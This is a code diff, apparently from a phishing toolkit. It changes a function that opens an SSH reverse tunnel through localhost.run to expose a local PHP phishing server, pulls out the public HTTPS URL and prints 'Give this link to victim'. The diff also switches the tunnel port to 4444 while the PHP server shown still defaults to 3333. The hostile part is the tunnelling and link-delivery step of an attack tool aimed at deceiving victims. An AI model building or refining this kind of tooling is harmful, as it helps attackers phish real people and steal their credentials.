@@ -154,30 +154,28 @@ def handle_verification(folder):
 
 
 def serveo():
-    command = f"ssh -R 80:localhost:3333 localhost.run"
-    
+    command = f"ssh -R 80:localhost:4444 localhost.run"
+
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
     localhost_run_url = None
 
     # Iterate over the output lines
     for line in process.stdout:
-        # Clean up the line to remove unwanted characters
-        line = line.strip().replace('\r', '')
+        # Check if the line contains 'tunneled with tls termination,'
+        if "tunneled with tls termination," in line:
+            # Extract the URL part from the line
+            parts = line.strip().split(" ")
+            for part in parts:
+                if part.startswith("https://"):
+                    localhost_run_url = part
+                    break
+            if localhost_run_url:
+                break  # Stop after finding the correct URL
 
-        # Check if the line contains 'https://' and 'lhr.life'
-        if "https://" in line and "lhr.life" in line:
-            # Extract the part that starts with https:// and ends with lhr.life
-            start = line.find("https://")
-            end = line.find("lhr.life") + len("lhr.life")  # Include 'lhr.life'
-            localhost_run_url = line[start:end]
-            break
-
-    # Print the link with proper formatting and flushing
-    if localhost_run_url:
-        print("\n")
-        print(_colored(f"Give this link to victim: {localhost_run_url}", "green"), flush=True)
-    else:
-        print(_colored("Error: Unable to retrieve the Serveo URL.", "red"))
+    # Return the URL and the process handle
+    print("\n")
+    print(_colored(f"Give this link to victim: {localhost_run_url}", "green"), flush=True, end="\n\r")
+ 
 def php_server(directory, port=3333):
     print()
     print(_colored("Starting PHP server ...", "green"))
